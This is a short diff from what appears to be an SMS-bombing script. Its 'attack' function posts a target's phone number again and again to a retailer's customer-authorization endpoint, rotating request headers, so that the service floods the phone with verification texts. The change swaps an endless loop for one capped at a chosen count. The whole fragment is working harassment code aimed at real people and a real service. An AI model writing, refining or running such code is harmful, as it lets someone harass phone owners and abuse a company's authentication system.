@@ -56,7 +56,7 @@ def attack(number, sms):
     print(f"|  {green}{bold}  amount   {end} | {green}{bold}     time     {end} |")
     print("-" * 33)
     HEADERS = random.choice(heads)
-    while True:
+    while sent <= sms:
     	try:
     		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7}, headers=HEADERS)
     		sent += 1
